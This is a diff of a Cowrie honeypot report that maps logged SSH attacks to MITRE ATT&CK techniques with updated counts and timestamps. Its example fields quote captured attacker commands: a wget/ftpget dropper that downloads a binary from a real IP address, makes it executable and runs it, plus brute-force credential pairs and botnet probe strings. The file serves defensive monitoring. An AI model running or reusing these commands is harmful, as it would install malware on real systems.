@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-01 08:00:55",
+  "generated": "2026-09-01 09:04:12",
   "totals": {
-    "commands": 603,
-    "login_failed": 10379,
-    "login_success": 114,
-    "sessions": 10557
+    "commands": 639,
+    "login_failed": 10446,
+    "login_success": 120,
+    "sessions": 10616
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 10379,
+      "count": 10446,
       "examples": [
         "admin / 1111",
         "root / Password01",
@@ -21,14 +21,14 @@
         "ubuntu / 123456"
       ],
       "first": "2026-09-01T00:00:06.311906Z",
-      "last": "2026-09-01T07:58:37.212341Z",
-      "unique_ips": 95
+      "last": "2026-09-01T09:04:06.071746Z",
+      "unique_ips": 109
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 114,
+      "count": 120,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "enable\\x00 / system\\x00",
@@ -37,14 +37,14 @@
         "zabbix / zabbix"
       ],
       "first": "2026-09-01T00:00:14.423114Z",
-      "last": "2026-09-01T07:48:11.404546Z",
-      "unique_ips": 53
+      "last": "2026-09-01T09:03:59.556530Z",
+      "unique_ips": 57
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 47,
+      "count": 61,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
@@ -53,14 +53,14 @@
         ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
       ],
       "first": "2026-09-01T01:17:40.680014Z",
-      "last": "2026-09-01T06:14:42.259809Z",
-      "unique_ips": 4
+      "last": "2026-09-01T09:04:09.052125Z",
+      "unique_ips": 5
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 12,
+      "count": 15,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -68,8 +68,8 @@
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f"
       ],
       "first": "2026-09-01T02:10:48.855600Z",
-      "last": "2026-09-01T06:14:42.259809Z",
-      "unique_ips": 3
+      "last": "2026-09-01T09:04:09.052125Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
@@ -89,14 +89,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 5,
+      "count": 6,
       "examples": [
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-01T01:17:40.680014Z",
-      "last": "2026-09-01T06:14:05.269913Z",
-      "unique_ips": 4
+      "last": "2026-09-01T09:04:03.593345Z",
+      "unique_ips": 5
     },
     {
       "id": "T1059.004",
@@ -130,42 +130,46 @@
     ],
     [
       "shell",
-      65
+      68
     ],
     [
       "sh",
-      64
+      67
     ],
     [
       "system",
-      63
+      66
     ],
     [
       "/bin/busybox UNSTABLE",
-      60
+      62
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      6
     ],
     [
       "enable",
-      3
+      4
     ],
     [
       "linuxshell",
-      3
+      4
     ],
     [
       "enablelinuxshell",
-      3
+      4
     ],
     [
       "ping ;sh",
-      3
-    ],
-    [
-      "busybox",
-      3
+      4
     ],
     [
       "cd /proc && cat self/cmdline",
+      4
+    ],
+    [
+      "busybox",
       3
     ],
     [
